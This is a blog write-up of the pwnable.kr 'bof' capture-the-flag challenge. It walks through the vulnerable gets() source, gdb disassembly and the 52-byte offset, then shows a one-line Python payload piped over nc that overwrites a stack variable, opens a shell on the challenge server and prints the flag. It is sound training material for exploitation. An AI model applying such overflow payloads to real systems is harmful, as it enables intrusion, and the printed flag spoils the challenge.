|[Home](/README.md)|[Projects](/projects.md)|[Articles](/articles.md)|[Apophthegm](/apophthegm.md)|[About](/about.md)|

# **Toddler's Bottle - bof**

Toddler's Bottle is one of the CTF games at pwnable.kr website.  I am going to do the game is namely bof.  There are already many writeups in the internet.  However, I am going to explain what I learnt from this game.

[Website](http://pwnable.kr/play.php) (Select bof)
[Source Code](http://pwnable.kr/bin/bof.c)
[Binary](http://pwnable.kr/bin/bof)

[Exploit Server](pwnable.kr:9000)

The source code of the bof binary is provided.  I examine the source code and found out that we are going to replace the "key" from "0xdeadbeef" to "0xcafebabe".  The "overflowme" variable is 32 characters long.  No matter what you entered in the "overflowme" variable, the "key" is not changed as it is hard coded.  It is a buffer overflow challenge.  However, we are not going to take control of the return address this time.

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
        char overflowme[32];
        printf("overflow me : ");
        gets(overflowme);       // smash me!
        if(key == 0xcafebabe){
                system("/bin/sh");
        }
        else{
                printf("Nah..\n");
        }
}
int main(int argc, char* argv[]){
        func(0xdeadbeef);
        return 0;
}
```

Load the gdb with PEDA and check with "checksec".  It is confirmed that the NX is enabled with another restrictions.

```bash
gdb -q ./bof
```
```bash
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : Partial
```

Run ```disass main``` to disassemble the ```main``` function.

```bash
disass main
```
```bash
gdb-peda$ disass main
Dump of assembler code for function main:
   0x0000068a <+0>:     push   ebp
   0x0000068b <+1>:     mov    ebp,esp
   0x0000068d <+3>:     and    esp,0xfffffff0
   0x00000690 <+6>:     sub    esp,0x10
   0x00000693 <+9>:     mov    DWORD PTR [esp],0xdeadbeef
   0x0000069a <+16>:    call   0x62c <func>
   0x0000069f <+21>:    mov    eax,0x0
   0x000006a4 <+26>:    leave  
   0x000006a5 <+27>:    ret    
End of assembler dump.
gdb-peda$
```

Run ```disass func``` to disassembe the ```func``` function.

```bash
disass func
```
```bash
gdb-peda$ disass func
Dump of assembler code for function func:
   0x0000062c <+0>:     push   ebp
   0x0000062d <+1>:     mov    ebp,esp
   0x0000062f <+3>:     sub    esp,0x48
   0x00000632 <+6>:     mov    eax,gs:0x14
   0x00000638 <+12>:    mov    DWORD PTR [ebp-0xc],eax
   0x0000063b <+15>:    xor    eax,eax
   0x0000063d <+17>:    mov    DWORD PTR [esp],0x78c
   0x00000644 <+24>:    call   0x645 <func+25>
   0x00000649 <+29>:    lea    eax,[ebp-0x2c]
   0x0000064c <+32>:    mov    DWORD PTR [esp],eax
   0x0000064f <+35>:    call   0x650 <func+36>
   0x00000654 <+40>:    cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x0000065b <+47>:    jne    0x66b <func+63>
   0x0000065d <+49>:    mov    DWORD PTR [esp],0x79b
   0x00000664 <+56>:    call   0x665 <func+57>
   0x00000669 <+61>:    jmp    0x677 <func+75>
   0x0000066b <+63>:    mov    DWORD PTR [esp],0x7a3
   0x00000672 <+70>:    call   0x673 <func+71>
   0x00000677 <+75>:    mov    eax,DWORD PTR [ebp-0xc]
   0x0000067a <+78>:    xor    eax,DWORD PTR gs:0x14
   0x00000681 <+85>:    je     0x688 <func+92>
   0x00000683 <+87>:    call   0x684 <func+88>
   0x00000688 <+92>:    leave  
   0x00000689 <+93>:    ret    
End of assembler dump.
gdb-peda$
```

In the ```func``` function, the following codes that I am interested in.

```bash
0x00000649 <+29>:    lea  eax,[ebp-0x2c]
0x0000064c <+32>:    mov  DWORD PTR [esp],eax
0x0000064f <+35>:    call 0x650 <func+36>
0x00000654 <+40>:    cmp  DWORD PTR [ebp+0x8],0xcafebabe
0x0000065b <+47>:    jne  0x66b <func+63>
```

The ```eax,[ebp-0x2c]```, ```ebp-0x2c``` may be contained the value of ```overflowme``` variable and saved in eax register.

The ```DWORD PTR [ebp+0x8],0xcafebabe```, ```ebp+0x8``` may be contained the value of key, that is ```0xdeadbeef```.

I am going to set a breakpoint at ```0x0000065b <+47>```.

```bash
b *func+47
```
```bash
gdb-peda$ b *func+47
Breakpoint 1 at 0x65b
gdb-peda$ r
Starting program: /root/20181212/bof
overflow me :
helloworld
```

Then ```r``` run the program and is prompted for entering ```helloworld``` as the ```overflowme```.

```bash
[----------------------------------registers-----------------------------------]
EAX: 0xbffff30c ("helloworld")
EBX: 0x0
ECX: 0xb7fab5c0 --> 0xfbad2288
EDX: 0xb7fac89c --> 0x0
ESI: 0xb7fab000 --> 0x1d5d8c
EDI: 0x0
EBP: 0xbffff338 --> 0xbffff358 --> 0x0
ESP: 0xbffff2f0 --> 0xbffff30c ("helloworld")
EIP: 0x40065b (<func+47>:   jne    0x40066b <func+63>)
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x40064c <func+32>:  mov    DWORD PTR [esp],eax
   0x40064f <func+35>:  call   0xb7e3c5c0 <_IO_gets>
   0x400654 <func+40>:  cmp    DWORD PTR [ebp+0x8],0xcafebabe
=> 0x40065b <func+47>:  jne    0x40066b <func+63>
 | 0x40065d <func+49>:  mov    DWORD PTR [esp],0x40079b
 | 0x400664 <func+56>:  call   0xb7e12870 <__libc_system>
 | 0x400669 <func+61>:  jmp    0x400677 <func+75>
 | 0x40066b <func+63>:  mov    DWORD PTR [esp],0x4007a3
 |->   0x40066b <func+63>:  mov    DWORD PTR [esp],0x4007a3
       0x400672 <func+70>:  call   0xb7e3ce40 <_IO_puts>
       0x400677 <func+75>:  mov    eax,DWORD PTR [ebp-0xc]
       0x40067a <func+78>:  xor    eax,DWORD PTR gs:0x14
                                                                  JUMP is taken
[------------------------------------stack-------------------------------------]
0000| 0xbffff2f0 --> 0xbffff30c ("helloworld")
0004| 0xbffff2f4 --> 0x0
0008| 0xbffff2f8 --> 0x0
0012| 0xbffff2fc --> 0xb7dd1b00
0016| 0xbffff300 --> 0x9 ('\t')
0020| 0xbffff304 --> 0xbffff578 ("/root/20181212/bof")
0024| 0xbffff308 --> 0xb7e05d09 (<__new_exitfn+9>:  add    ebx,0x1a52f7)
0028| 0xbffff30c ("helloworld")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
 
Breakpoint 1, 0x0040065b in func ()
```

After entering the ```helloworld```, I am going to examine the ```eax``` and ```ebp+0x8```.

```bash
x/x $ebp+0x8

x/s $eax
```
```bash
gdb-peda$ x/x $ebp+0x8
0xbffff340: 0xdeadbeef
gdb-peda$ x/s $eax
0xbffff30c: "helloworld"
gdb-peda$
```

The result confirmed what I suspected.  I am going to check the offset the two addresses with Python.  The offset is ```52```.

```python
root@kali:~# python
Python 2.7.15+ (default, Nov 28 2018, 16:27:22)
[GCC 8.2.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> 0xbffff340 - 0xbffff30c
52L
>>>
```

Once get the offset, I am going to overwrite the ```0xdeadbeef``` with ```0xcafebabe``` with the exploit code.  The ```cat``` command is for the interactive with the shell.

```bash
(python -c 'print "A"*52 + "\xbe\xba\xfe\xca"'; cat -) | nc pwnable.kr 9000
```bash
root@kali:~/20181212# (python -c 'print "A"*52 + "\xbe\xba\xfe\xca"'; cat -) | nc pwnable.kr 9000
id
uid=1008(bof) gid=1008(bof) groups=1008(bof)
ls
bof
bof.c
flag
log
log2
super.pl
cat flag
daddy, I just pwned a buFFer :)
```

The flag is :
```
daddy, I just pwned a buFFer :)
```

[![](https://img.youtube.com/vi/SKZa5eLuO90/0.jpg)](https://www.youtube.com/watch?v=w1T9B9bixjA)


|[Home](/README.md)|[Projects](/projects.md)|[Articles](/articles.md)|[Apophthegm](/apophthegm.md)|[About](/about.md)|
